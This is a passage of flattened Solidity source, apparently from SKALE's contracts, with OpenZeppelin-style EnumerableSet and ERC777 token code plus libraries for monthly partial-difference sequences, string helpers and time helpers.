/**\n\n     * @dev Removes a value from a set. O(1).\n\n     *\n\n     * Returns true if the value was removed from the set, that is if it was\n\n     * present.\n\n     */\n\n    function _remove(Set storage set, bytes32 value) private returns (bool) {\n\n        // We read and store the value\'s index to prevent multiple reads from the same storage slot\n\n        uint256 valueIndex = set._indexes[value];\n\n\n\n        if (valueIndex != 0) { // Equivalent to contains(set, value)\n\n            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in\n\n            // the array, and then remove the last element (sometimes called as \'swap and pop\').\n\n            // This modifies the order of the array, as noted in {at}.\n\n\n\n            uint256 toDeleteIndex = valueIndex - 1;\n\n            uint256 lastIndex = set._values.length - 1;\n\n\n\n            // When the value to delete is the last one, the swap operation is unnecessary. However, since this occurs\n\n            // so rarely, we still do the swap anyway to avoid the gas cost of adding an \'if\' statement.\n\n\n\n            bytes32 lastvalue = set._values[lastIndex];\n\n\n\n            // Move the last value to the index where the value to delete is\n\n            set._values[toDeleteIndex] = lastvalue;\n\n            // Update the index for the moved value\n\n            set._indexes[lastvalue] = toDeleteIndex + 1; // All indexes are 1-based\n\n\n\n            // Delete the slot where the moved value was stored\n\n            set._values.pop();\n\n\n\n            // Delete the index for the deleted slot\n\n            delete set._indexes[value];\n\n\n\n            return true;\n\n        } else {\n\n            return false;\n\n        }\n\n    }\n\n\n\n    /**\n\n     * @dev Returns true if the value is in the set. O(1).\n\n     */\n\n    function _contains(Set storage set, bytes32 value) private view returns (bool) {\n\n        return set._indexes[value] != 0;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the number of values on the set. O(1).\n\n     */\n\n    function _length(Set storage set) private view returns (uint256) {\n\n        return set._values.length;\n\n    }\n\n\n\n   /**\n\n    * @dev Returns the value stored at position `index` in the set. O(1).\n\n    *\n\n    * Note that there are no guarantees on the ordering of values inside the\n\n    * array, and it may change when more values are added or removed.\n\n    *\n\n    * Requirements:\n\n    *\n\n    * - `index` must be strictly less than {length}.\n\n    */\n\n    function _at(Set storage set, uint256 index) private view returns (bytes32) {\n\n        require(set._values.length > index, "EnumerableSet: index out of bounds");\n\n        return set._values[index];\n\n    }\n\n\n\n    // AddressSet\n\n\n\n    struct AddressSet {\n\n        Set _inner;\n\n    }\n\n\n\n    /**\n\n     * @dev Add a value to a set. O(1).\n\n     *\n\n     * Returns true if the value was added to the set, that is if it was not\n\n     * already present.\n\n     */\n\n    function add(AddressSet storage set, address value) internal returns (bool) {\n\n        return _add(set._inner, bytes32(uint256(value)));\n\n    }\n\n\n\n    /**\n\n     * @dev Removes a value from a set. O(1).\n\n     *\n\n     * Returns true if the value was removed from the set, that is if it was\n\n     * present.\n\n     */\n\n    function remove(AddressSet storage set, address value) internal returns (bool) {\n\n        return _remove(set._inner, bytes32(uint256(value)));\n\n    }\n\n\n\n    /**\n\n     * @dev Returns true if the value is in the set. O(1).\n\n     */\n\n    function contains(AddressSet storage set, address value) internal view returns (bool) {\n\n        return _contains(set._inner, bytes32(uint256(value)));\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the number of values in the set. O(1).\n\n     */\n\n    function length(AddressSet storage set) internal view returns (uint256) {\n\n        return _length(set._inner);\n\n    }\n\n\n\n   /**\n\n    * @dev Returns the value stored at position `index` in the set. O(1).\n\n    *\n\n    * Note that there are no guarantees on the ordering of values inside the\n\n    * array, and it may change when more values are added or removed.\n\n    *\n\n    * Requirements:\n\n    *\n\n    * - `index` must be strictly less than {length}.\n\n    */\n\n    function at(AddressSet storage set, uint256 index) internal view returns (address) {\n\n        return address(uint256(_at(set._inner, index)));\n\n    }\n\n\n\n\n\n    // UintSet\n\n\n\n    struct UintSet {\n\n        Set _inner;\n\n    }\n\n\n\n    /**\n\n     * @dev Add a value to a set. O(1).\n\n     *\n\n     * Returns true if the value was added to the set, that is if it was not\n\n     * already present.\n\n     */\n\n    function add(UintSet storage set, uint256 value) internal returns (bool) {\n\n        return _add(set._inner, bytes32(value));\n\n    }\n\n\n\n    /**\n\n     * @dev Removes a value from a set. O(1).\n\n     *\n\n     * Returns true if the value was removed from the set, that is if it was\n\n     * present.\n\n     */\n\n    function remove(UintSet storage set, uint256 value) internal returns (bool) {\n\n        return _remove(set._inner, bytes32(value));\n\n    }\n\n\n\n    /**\n\n     * @dev Returns true if the value is in the set. O(1).\n\n     */\n\n    function contains(UintSet storage set, uint256 value) internal view returns (bool) {\n\n        return _contains(set._inner, bytes32(value));\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the number of values on the set. O(1).\n\n     */\n\n    function length(UintSet storage set) internal view returns (uint256) {\n\n        return _length(set._inner);\n\n    }\n\n\n\n   /**\n\n    * @dev Returns the value stored at position `index` in the set. O(1).\n\n    *\n\n    * Note that there are no guarantees on the ordering of values inside the\n\n    * array, and it may change when more values are added or removed.\n\n    *\n\n    * Requirements:\n\n    *\n\n    * - `index` must be strictly less than {length}.\n\n    */\n\n    function at(UintSet storage set, uint256 index) internal view returns (uint256) {\n\n        return uint256(_at(set._inner, index));\n\n    }\n\n}\n\ncontract Initializable {\n\n\n\n  /**\n\n   * @dev Indicates that the contract has been initialized.\n\n   */\n\n  bool private initialized;\n\n\n\n  /**\n\n   * @dev Indicates that the contract is in the process of being initialized.\n\n   */\n\n  bool private initializing;\n\n\n\n  /**\n\n   * @dev Modifier to use in the initializer function of a contract.\n\n   */\n\n  modifier initializer() {\n\n    require(initializing || isConstructor() || !initialized, "Contract instance has already been initialized");\n\n\n\n    bool isTopLevelCall = !initializing;\n\n    if (isTopLevelCall) {\n\n      initializing = true;\n\n      initialized = true;\n\n    }\n\n\n\n    _;\n\n\n\n    if (isTopLevelCall) {\n\n      initializing = false;\n\n    }\n\n  }\n\n\n\n  /// @dev Returns true if and only if the function is running in the constructor\n\n  function isConstructor() private view returns (bool) {\n\n    // extcodesize checks the size of the code stored in an address, and\n\n    // address returns the current address. Since the code is still not\n\n    // deployed when running a constructor, any checks on its code size will\n\n    // yield zero, making it an effective way to detect if a contract is\n\n    // under construction or not.\n\n    address self = address(this);\n\n    uint256 cs;\n\n    assembly { cs := extcodesize(self) }\n\n    return cs == 0;\n\n  }\n\n\n\n  // Reserved storage space to allow for layout changes in the future.\n\n  uint256[50] private ______gap;\n\n}\n\nlibrary PartialDifferences {\n\n    using SafeMath for uint;\n\n    using MathUtils for uint;\n\n\n\n    struct Sequence {\n\n             // month => diff\n\n        mapping (uint => uint) addDiff;\n\n             // month => diff\n\n        mapping (uint => uint) subtractDiff;\n\n             // month => value\n\n        mapping (uint => uint) value;\n\n\n\n        uint firstUnprocessedMonth;\n\n        uint lastChangedMonth;\n\n    }\n\n\n\n    struct Value {\n\n             // month => diff\n\n        mapping (uint => uint) addDiff;\n\n             // month => diff\n\n        mapping (uint => uint) subtractDiff;\n\n\n\n        uint value;\n\n        uint firstUnprocessedMonth;\n\n        uint lastChangedMonth;\n\n    }\n\n\n\n    // functions for sequence\n\n\n\n    function addToSequence(Sequence storage sequence, uint diff, uint month) internal {\n\n        require(sequence.firstUnprocessedMonth <= month, "Cannot add to the past");\n\n        if (sequence.firstUnprocessedMonth == 0) {\n\n            sequence.firstUnprocessedMonth = month;\n\n        }\n\n        sequence.addDiff[month] = sequence.addDiff[month].add(diff);\n\n        if (sequence.lastChangedMonth != month) {\n\n            sequence.lastChangedMonth = month;\n\n        }\n\n    }\n\n\n\n    function subtractFromSequence(Sequence storage sequence, uint diff, uint month) internal {\n\n        require(sequence.firstUnprocessedMonth <= month, "Cannot subtract from the past");\n\n        if (sequence.firstUnprocessedMonth == 0) {\n\n            sequence.firstUnprocessedMonth = month;\n\n        }\n\n        sequence.subtractDiff[month] = sequence.subtractDiff[month].add(diff);\n\n        if (sequence.lastChangedMonth != month) {\n\n            sequence.lastChangedMonth = month;\n\n        }\n\n    }\n\n\n\n    function getAndUpdateValueInSequence(Sequence storage sequence, uint month) internal returns (uint) {\n\n        if (sequence.firstUnprocessedMonth == 0) {\n\n            return 0;\n\n        }\n\n\n\n        if (sequence.firstUnprocessedMonth <= month) {\n\n            for (uint i = sequence.firstUnprocessedMonth; i <= month; ++i) {\n\n                uint nextValue = sequence.value[i.sub(1)].add(sequence.addDiff[i]).boundedSub(sequence.subtractDiff[i]);\n\n                if (sequence.value[i] != nextValue) {\n\n                    sequence.value[i] = nextValue;\n\n                }\n\n                if (sequence.addDiff[i] > 0) {\n\n                    delete sequence.addDiff[i];\n\n                }\n\n                if (sequence.subtractDiff[i] > 0) {\n\n                    delete sequence.subtractDiff[i];\n\n                }\n\n            }\n\n            sequence.firstUnprocessedMonth = month.add(1);\n\n        }\n\n\n\n        return sequence.value[month];\n\n    }\n\n\n\n    function reduceSequence(\n\n        Sequence storage sequence,\n\n        FractionUtils.Fraction memory reducingCoefficient,\n\n        uint month) internal\n\n    {\n\n        require(month.add(1) >= sequence.firstUnprocessedMonth, "Can\'t reduce value in the past");\n\n        require(\n\n            reducingCoefficient.numerator <= reducingCoefficient.denominator,\n\n            "Increasing of values is not implemented");\n\n        if (sequence.firstUnprocessedMonth == 0) {\n\n            return;\n\n        }\n\n        uint value = getAndUpdateValueInSequence(sequence, month);\n\n        if (value.approximatelyEqual(0)) {\n\n            return;\n\n        }\n\n\n\n        sequence.value[month] = sequence.value[month]\n\n            .mul(reducingCoefficient.numerator)\n\n            .div(reducingCoefficient.denominator);\n\n\n\n        for (uint i = month.add(1); i <= sequence.lastChangedMonth; ++i) {\n\n            sequence.subtractDiff[i] = sequence.subtractDiff[i]\n\n                .mul(reducingCoefficient.numerator)\n\n                .div(reducingCoefficient.denominator);\n\n        }\n\n    }\n\n\n\n    // functions for value\n\n\n\n    function addToValue(Value storage sequence, uint diff, uint month) internal {\n\n        require(sequence.firstUnprocessedMonth <= month, "Cannot add to the past");\n\n        if (sequence.firstUnprocessedMonth == 0) {\n\n            sequence.firstUnprocessedMonth = month;\n\n            sequence.lastChangedMonth = month;\n\n        }\n\n        if (month > sequence.lastChangedMonth) {\n\n            sequence.lastChangedMonth = month;\n\n        }\n\n\n\n        if (month >= sequence.firstUnprocessedMonth) {\n\n            sequence.addDiff[month] = sequence.addDiff[month].add(diff);\n\n        } else {\n\n            sequence.value = sequence.value.add(diff);\n\n        }\n\n    }\n\n\n\n    function subtractFromValue(Value storage sequence, uint diff, uint month) internal {\n\n        require(sequence.firstUnprocessedMonth <= month.add(1), "Cannot subtract from the past");\n\n        if (sequence.firstUnprocessedMonth == 0) {\n\n            sequence.firstUnprocessedMonth = month;\n\n            sequence.lastChangedMonth = month;\n\n        }\n\n        if (month > sequence.lastChangedMonth) {\n\n            sequence.lastChangedMonth = month;\n\n        }\n\n\n\n        if (month >= sequence.firstUnprocessedMonth) {\n\n            sequence.subtractDiff[month] = sequence.subtractDiff[month].add(diff);\n\n        } else {\n\n            sequence.value = sequence.value.boundedSub(diff);\n\n        }\n\n    }\n\n\n\n    function getAndUpdateValue(Value storage sequence, uint month) internal returns (uint) {\n\n        require(\n\n            month.add(1) >= sequence.firstUnprocessedMonth,\n\n            "Cannot calculate value in the past");\n\n        if (sequence.firstUnprocessedMonth == 0) {\n\n            return 0;\n\n        }\n\n\n\n        if (sequence.firstUnprocessedMonth <= month) {\n\n            for (uint i = sequence.firstUnprocessedMonth; i <= month; ++i) {\n\n                uint newValue = sequence.value.add(sequence.addDiff[i]).boundedSub(sequence.subtractDiff[i]);\n\n                if (sequence.value != newValue) {\n\n                    sequence.value = newValue;\n\n                }\n\n                if (sequence.addDiff[i] > 0) {\n\n                    delete sequence.addDiff[i];\n\n                }\n\n                if (sequence.subtractDiff[i] > 0) {\n\n                    delete sequence.subtractDiff[i];\n\n                }\n\n            }\n\n            sequence.firstUnprocessedMonth = month.add(1);\n\n        }\n\n\n\n        return sequence.value;\n\n    }\n\n\n\n    function reduceValue(\n\n        Value storage sequence,\n\n        uint amount,\n\n        uint month)\n\n        internal returns (FractionUtils.Fraction memory)\n\n    {\n\n        require(month.add(1) >= sequence.firstUnprocessedMonth, "Cannot reduce value in the past");\n\n        if (sequence.firstUnprocessedMonth == 0) {\n\n            return FractionUtils.createFraction(0);\n\n        }\n\n        uint value = getAndUpdateValue(sequence, month);\n\n        if (value.approximatelyEqual(0)) {\n\n            return FractionUtils.createFraction(0);\n\n        }\n\n\n\n        uint _amount = amount;\n\n        if (value < amount) {\n\n            _amount = value;\n\n        }\n\n\n\n        FractionUtils.Fraction memory reducingCoefficient =\n\n            FractionUtils.createFraction(value.boundedSub(_amount), value);\n\n        reduceValueByCoefficient(sequence, reducingCoefficient, month);\n\n        return reducingCoefficient;\n\n    }\n\n\n\n    function reduceValueByCoefficient(\n\n        Value storage sequence,\n\n        FractionUtils.Fraction memory reducingCoefficient,\n\n        uint month)\n\n        internal\n\n    {\n\n        reduceValueByCoefficientAndUpdateSumIfNeeded(\n\n            sequence,\n\n            sequence,\n\n            reducingCoefficient,\n\n            month,\n\n            false);\n\n    }\n\n\n\n    function reduceValueByCoefficientAndUpdateSum(\n\n        Value storage sequence,\n\n        Value storage sumSequence,\n\n        FractionUtils.Fraction memory reducingCoefficient,\n\n        uint month) internal\n\n    {\n\n        reduceValueByCoefficientAndUpdateSumIfNeeded(\n\n            sequence,\n\n            sumSequence,\n\n            reducingCoefficient,\n\n            month,\n\n            true);\n\n    }\n\n\n\n    function reduceValueByCoefficientAndUpdateSumIfNeeded(\n\n        Value storage sequence,\n\n        Value storage sumSequence,\n\n        FractionUtils.Fraction memory reducingCoefficient,\n\n        uint month,\n\n        bool hasSumSequence) internal\n\n    {\n\n        require(month.add(1) >= sequence.firstUnprocessedMonth, "Cannot reduce value in the past");\n\n        if (hasSumSequence) {\n\n            require(month.add(1) >= sumSequence.firstUnprocessedMonth, "Cannot reduce value in the past");\n\n        }\n\n        require(\n\n            reducingCoefficient.numerator <= reducingCoefficient.denominator,\n\n            "Increasing of values is not implemented");\n\n        if (sequence.firstUnprocessedMonth == 0) {\n\n            return;\n\n        }\n\n        uint value = getAndUpdateValue(sequence, month);\n\n        if (value.approximatelyEqual(0)) {\n\n            return;\n\n        }\n\n\n\n        uint newValue = sequence.value.mul(reducingCoefficient.numerator).div(reducingCoefficient.denominator);\n\n        if (hasSumSequence) {\n\n            subtractFromValue(sumSequence, sequence.value.boundedSub(newValue), month);\n\n        }\n\n        sequence.value = newValue;\n\n\n\n        for (uint i = month.add(1); i <= sequence.lastChangedMonth; ++i) {\n\n            uint newDiff = sequence.subtractDiff[i]\n\n                .mul(reducingCoefficient.numerator)\n\n                .div(reducingCoefficient.denominator);\n\n            if (hasSumSequence) {\n\n                sumSequence.subtractDiff[i] = sumSequence.subtractDiff[i]\n\n                    .boundedSub(sequence.subtractDiff[i].boundedSub(newDiff));\n\n            }\n\n            sequence.subtractDiff[i] = newDiff;\n\n        }\n\n    }\n\n\n\n    function clear(Value storage sequence) internal {\n\n        for (uint i = sequence.firstUnprocessedMonth; i <= sequence.lastChangedMonth; ++i) {\n\n            if (sequence.addDiff[i] > 0) {\n\n                delete sequence.addDiff[i];\n\n            }\n\n            if (sequence.subtractDiff[i] > 0) {\n\n                delete sequence.subtractDiff[i];\n\n            }\n\n        }\n\n        if (sequence.value > 0) {\n\n            delete sequence.value;\n\n        }\n\n        if (sequence.firstUnprocessedMonth > 0) {\n\n            delete sequence.firstUnprocessedMonth;\n\n        }\n\n        if (sequence.lastChangedMonth > 0) {\n\n            delete sequence.lastChangedMonth;\n\n        }\n\n    }\n\n}\n\nlibrary StringUtils {\n\n    using SafeMath for uint;\n\n\n\n    function strConcat(string memory a, string memory b) internal pure returns (string memory) {\n\n        bytes memory _ba = bytes(a);\n\n        bytes memory _bb = bytes(b);\n\n\n\n        string memory ab = new string(_ba.length.add(_bb.length));\n\n        bytes memory strBytes = bytes(ab);\n\n        uint k = 0;\n\n        uint i = 0;\n\n        for (i = 0; i < _ba.length; i++) {\n\n            strBytes[k++] = _ba[i];\n\n        }\n\n        for (i = 0; i < _bb.length; i++) {\n\n            strBytes[k++] = _bb[i];\n\n        }\n\n        return string(strBytes);\n\n    }\n\n\n\n    function uint2str(uint i) internal pure returns (string memory) {\n\n        if (i == 0) {\n\n            return "0";\n\n        }\n\n        uint j = i;\n\n        uint _i = i;\n\n        uint len;\n\n        while (j != 0) {\n\n            len++;\n\n            j /= 10;\n\n        }\n\n        bytes memory bstr = new bytes(len);\n\n        uint k = len.sub(1);\n\n        while (_i != 0) {\n\n            bstr[k--] = byte(uint8(48 + _i % 10));\n\n            _i /= 10;\n\n        }\n\n        return string(bstr);\n\n    }\n\n}\n\ncontract TimeHelpers {\n\n    using SafeMath for uint;\n\n\n\n    uint constant private _ZERO_YEAR = 2020;\n\n\n\n    function calculateProofOfUseLockEndTime(uint month, uint lockUpPeriodDays) external view returns (uint timestamp) {\n\n        timestamp = BokkyPooBahsDateTimeLibrary.addDays(monthToTimestamp(month), lockUpPeriodDays);\n\n    }\n\n\n\n    function addMonths(uint fromTimestamp, uint n) external pure returns (uint) {\n\n        return BokkyPooBahsDateTimeLibrary.addMonths(fromTimestamp, n);\n\n    }\n\n\n\n    function getCurrentMonth() external view virtual returns (uint) {\n\n        return timestampToMonth(now);\n\n    }\n\n\n\n    function timestampToMonth(uint timestamp) public view virtual returns (uint) {\n\n        uint year;\n\n        uint month;\n\n        (year, month, ) = BokkyPooBahsDateTimeLibrary.timestampToDate(timestamp);\n\n        require(year >= _ZERO_YEAR, "Timestamp is too far in the past");\n\n        month = month.sub(1).add(year.sub(_ZERO_YEAR).mul(12));\n\n        require(month > 0, "Timestamp is too far in the past");\n\n        return month;\n\n    }\n\n\n\n    function monthToTimestamp(uint month) public view virtual returns (uint timestamp) {\n\n        uint year = _ZERO_YEAR;\n\n        uint _month = month;\n\n        year = year.add(_month.div(12));\n\n        _month = _month.mod(12);\n\n        _month = _month.add(1);\n\n        return BokkyPooBahsDateTimeLibrary.timestampFromDate(year, _month, 1);\n\n    }\n\n}\n\ncontract ERC777 is Context, IERC777, IERC20 {\n\n    using SafeMath for uint256;\n\n    using Address for address;\n\n\n\n    IERC1820Registry constant internal _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);\n\n\n\n    mapping(address => uint256) private _balances;\n\n\n\n    uint256 private _totalSupply;\n\n\n\n    string private _name;\n\n    string private _symbol;\n\n\n\n    // We inline the result of the following hashes because Solidity doesn\'t resolve them at compile time.\n\n    // See https://github.com/ethereum/solidity/issues/4024.\n\n\n\n    // keccak256("ERC777TokensSender")\n\n    bytes32 constant private _TOKENS_SENDER_INTERFACE_HASH =\n\n        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;\n\n\n\n    // keccak256("ERC777TokensRecipient")\n\n    bytes32 constant private _TOKENS_RECIPIENT_INTERFACE_HASH =\n\n        0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;\n\n\n\n    // This isn\'t ever read from - it\'s only used to respond to the defaultOperators query.\n\n    address[] private _defaultOperatorsArray;\n\n\n\n    // Immutable, but accounts may revoke them (tracked in __revokedDefaultOperators).\n\n    mapping(address => bool) private _defaultOperators;\n\n\n\n    // For each account, a mapping of its operators and revoked default operators.\n\n    mapping(address => mapping(address => bool)) private _operators;\n\n    mapping(address => mapping(address => bool)) private _revokedDefaultOperators;\n\n\n\n    // ERC20-allowances\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n\n\n    /**\n\n     * @dev `defaultOperators` may be an empty array.\n\n     */\n\n    constructor(\n\n        string memory name,\n\n        string memory symbol,\n\n        address[] memory defaultOperators\n\n    ) public {\n\n        _name = name;\n\n        _symbol = symbol;\n\n\n\n        _defaultOperatorsArray = defaultOperators;\n\n        for (uint256 i = 0; i < _defaultOperatorsArray.length; i++) {\n\n            _defaultOperators[_defaultOperatorsArray[i]] = true;\n\n        }\n\n\n\n        // register interfaces\n\n        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777Token"), address(this));\n\n        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC20Token"), address(this));\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC777-name}.\n\n     */\n\n    function name() public view override returns (string memory) {\n\n        return _name;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC777-symbol}.\n\n     */\n\n    function symbol() public view override returns (string memory) {\n\n        return _symbol;\n\n    }\n\n\n\n    /**\n\n     * @dev See {ERC20-decimals}.\n\n     *\n\n     * Always returns 18, as per the\n\n     * [ERC777 EIP](https://eips.ethereum.org/EIPS/eip-777#backward-compatibility).\n\n     */\n\n    function decimals() public pure returns (uint8) {\n\n        return 18;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC777-granularity}.\n\n     *\n\n     * This implementation always returns `1`.\n\n     */\n\n    function granularity() public view override returns (uint256) {\n\n        return 1;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC777-totalSupply}.\n\n     */\n\n    function totalSupply() public view override(IERC20, IERC777) returns (uint256) {\n\n        return _totalSupply;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the amount of tokens owned by an account (`tokenHolder`).\n\n     */\n\n    function balanceOf(address tokenHolder) public view override(IERC20, IERC777) returns (uint256) {\n\n        return _balances[tokenHolder];\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC777-send}.\n\n     *\n\n     * Also emits a {IERC20-Transfer} event for ERC20 compatibility.\n\n     */\n\n    function send(address recipient, uint256 amount, bytes memory data) public override  {\n\n        _send(_msgSender(), recipient, amount, data, "", true);\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-transfer}.\n\n     *\n\n     * Unlike `send`, `recipient` is _not_ required to implement the {IERC777Recipient}\n\n     * interface if it is a contract.\n\n     *\n\n     * Also emits a {Sent} event.\n\n     */\n\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n\n        require(recipient != address(0), "ERC777: transfer to the zero address");\n\n\n\n        address from = _msgSender();\n\n\n\n        _callTokensToSend(from, from, recipient, amount, "", "");\n\n\n\n        _move(from, from, recipient, amount, "", "");\n\n\n\n        _callTokensReceived(from, from, recipient, amount, "", "", false);\n\n\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC777-burn}.\n\n     *\n\n     * Also emits a {IERC20-Transfer} event for ERC20 compatibility.\n\n     */\n\n    function burn(uint256 amount, bytes memory data) public override  {\n\n        _burn(_msgSender(), amount, data, "");\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC777-isOperatorFor}.\n\n     */\n\n    function isOperatorFor(\n\n        address operator,\n\n        address tokenHolder\n\n    ) public view override returns (bool) {\n\n        return operator == tokenHolder ||\n\n            (_defaultOperators[operator] && !_revokedDefaultOperators[tokenHolder][operator]) ||\n\n            _operators[tokenHolder][operator];\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC777-authorizeOperator}.\n\n     */\n\n    function authorizeOperator(address operator) public override  {\n\n        require(_msgSender() != operator, "ERC777: authorizing self as operator");\n\n\n\n        if (_defaultOperators[operator]) {\n\n            delete _revokedDefaultOperators[_msgSender()][operator];\n\n        } else {\n\n            _operators[_msgSender()][operator] = true;\n\n        }\n\n\n\n        emit AuthorizedOperator(operator, _msgSender());\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC777-revokeOperator}.\n\n     */\n\n    function revokeOperator(address operator) public override  {\n\n        require(operator != _msgSender(), "ERC777: revoking self as operator");\n\n\n\n        if (_defaultOperators[operator]) {\n\n            _revokedDefaultOperators[_msgSender()][operator] = true;\n\n        } else {\n\n            delete _operators[_msgSender()][operator];\n\n        }\n\n\n\n        emit RevokedOperator(operator, _msgSender());\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC777-defaultOperators}.\n\n     */\n\n    function defaultOperators() public view override returns (address[] memory) {\n\n        return _defaultOperatorsArray;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC777-operatorSend}.\n\n     *\n\n     * Emits {Sent} and {IERC20-Transfer} events.\n\n     */\n\n    function operatorSend(\n\n        address sender,\n\n        address recipient,\n\n        uint256 amount,\n\n        bytes memory data,\n\n        bytes memory operatorData\n\n    )\n\n    public override\n\n    {\n\n        require(isOperatorFor(_msgSender(), sender), "ERC777: caller is not an operator for holder");\n\n        _send(sender, recipient, amount, data, operatorData, true);\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC777-operatorBurn}.\n\n     *\n\n     * Emits {Burned} and {IERC20-Transfer} events.\n\n     */\n\n    function operatorBurn(address account, uint256 amount, bytes memory data, bytes memory operatorData) public override {\n\n        require(isOperatorFor(_msgSender(), account), "ERC777: caller is not an operator for holder");\n\n        _burn(account, amount, data, operatorData);\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-allowance}.\n\n     *\n\n     * Note that operator and allowance concepts are orthogonal: operators may\n\n     * not have allowance, and accounts with allowance may not be operators\n\n     * themselves.\n\n     */\n\n    function allowance(address holder, address spender) public view override returns (uint256) {\n\n        return _allowances[holder][spender];\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-approve}.\n\n     *\n\n     * Note that accounts cannot have allowance issued by their operators.\n\n     */\n\n    function approve(address spender, uint256 value) public override returns (bool) {\n\n        address holder = _msgSender();\n\n        _approve(holder, spender, value);\n\n        return true;\n\n    }\n\n\n\n   /**\n\n    * @dev See {IERC20-transferFrom}.\n\n    *\n\n    * Note that operator and allowance concepts are orthogonal: operators cannot\n\n    * call `transferFrom` (unless they have allowance), and accounts with\n\n    * allowance cannot call `operatorSend` (unless they are operators).\n\n    *\n\n    * Emits {Sent}, {IERC20-Transfer} and {IERC20-Approval} events.\n\n    */\n\n    function transferFrom(address holder, address recipient, uint256 amount) public override returns (bool) {\n\n        require(recipient != address(0), "ERC777: transfer to the zero address");\n\n        require(holder != address(0), "ERC777: transfer from the zero address");\n\n\n\n        address spender = _msgSender();\n\n\n\n        _callTokensToSend(spender, holder, recipient, amount, "", "");\n\n\n\n        _move(spender, holder, recipient, amount, "", "");\n\n        _approve(holder, spender, _allowances[holder][spender].sub(amount, "ERC777: transfer amount exceeds allowance"));\n\n\n\n        _callTokensReceived(spender, holder, recipient, amount, "", "", false);\n\n\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev Creates `amount` tokens and assigns them to `account`, increasing\n\n     * the total supply.\n\n     *\n\n     * If a send hook is registered for `account`, the corresponding function\n\n     * will be called with `operator`, `data` and `operatorData`.\n\n     *\n\n     * See {IERC777Sender} and {IERC777Recipient}.\n\n     *\n\n     * Emits {Minted} and {IERC20-Transfer} events.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - `account` cannot be the zero address.\n\n     * - if `account` is a contract, it must implement the {IERC777Recipient}\n\n     * interface.\n\n     */\n\n    function _mint(\n\n        address account,\n\n        uint256 amount,\n\n        bytes memory userData,\n\n        bytes memory operatorData\n\n    )\n\n    internal virtual\n\n    {\n\n        require(account != address(0), "ERC777: mint to the zero address");\n\n\n\n        address operator = _msgSender();\n\n\n\n        _beforeTokenTransfer(operator, address(0), account, amount);\n\n\n\n        // Update state variables\n\n        _totalSupply = _totalSupply.add(amount);\n\n        _balances[account] = _balances[account].add(amount);\n\n\n\n        _callTokensReceived(operator, address(0), account, amount, userData, operatorData, true);\n\n\n\n        emit Minted(operator, account, amount, userData, operatorData);\n\n        emit Transfer(address(0), account, amount);\n\n    }\n\n\n\n    /**\n\n     * @dev Send tokens\n\n     * @param from address token holder address\n\n     * @param to address recipient address\n\n     * @param amount uint256 amount of tokens to transfer\n\n     * @param userData bytes extra information provided by the token holder (if any)\n\n     * @param operatorData bytes extra information provided by the operator (if any)\n\n     * @param requireReceptionAck if true, contract recipients are required to implement ERC777TokensRecipient\n\n     */\n\n    function _send(\n\n        address from,\n\n        address to,\n\n        uint256 amount,\n\n        bytes memory userData,\n\n        bytes memory operatorData,\n\n        bool requireReceptionAck\n\n    )\n\n        internal\n\n    {\n\n        require(from != address(0), "ERC777: send from the zero address");\n\n        require(to != address(0), "ERC777: send to the zero address");\n\n\n\n        address operator = _msgSender();\n\n\n\n        _callTokensToSend(operator, from, to, amount, userData, operatorData);\n\n\n\n        _move(operator, from, to, amount, userData, operatorData);\n\n\n\n        _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);\n\n    }\n\n\n\n    /**\n\n     * @dev Burn tokens\n\n     * @param from address token holder address\n\n     * @param amount uint256 amount of tokens to burn\n\n     * @param data bytes extra information provided by the token holder\n\n     * @param operatorData bytes extra information provided by the operator (if any)\n\n     */\n\n    function _burn(\n\n        address from,\n\n        uint256 amount,\n\n        bytes memory data,\n\n        bytes memory operatorData\n\n    )\n\n        internal virtual\n\n    {\n\n        require(from != address(0), "ERC777: burn from the zero address");\n\n\n\n        address operator = _msgSender();\n\n\n\n        /* Chaged by SKALE: we swapped these lines to prevent delegation of burning tokens */\n\n\n\n        _callTokensToSend(operator, from, address(0), amount, data, operatorData);\n\n\n\n        _beforeTokenTransfer(operator, from, address(0), amount);\n\n\n\n        /* End of changed by SKALE */\n\n\n\n        // Update state variables\n\n        _balances[from] = _balances[from].sub(amount, "ERC777: burn amount exceeds balance");\n\n        _totalSupply = _totalSupply.sub(amount);\n\n\n\n        emit Burned(operator, from, amount, data, operatorData);\n\n        emit Transfer(from, address(0), amount);\n\n    }\n\n\n\n    function _move(\n\n        address operator,\n\n        address from,\n\n        address to,\n\n        uint256 amount,\n\n        bytes memory userData,\n\n        bytes memory operatorData\n\n    )\n\n        private\n\n    {\n\n        _beforeTokenTransfer(operator, from, to, amount);\n\n\n\n        _balances[from] = _balances[from].sub(amount, "ERC777: transfer amount exceeds balance");\n\n        _balances[to] = _balances[to].add(amount);\n\n\n\n        emit Sent(operator, from, to, amount, userData, operatorData);\n\n        emit Transfer(from, to, 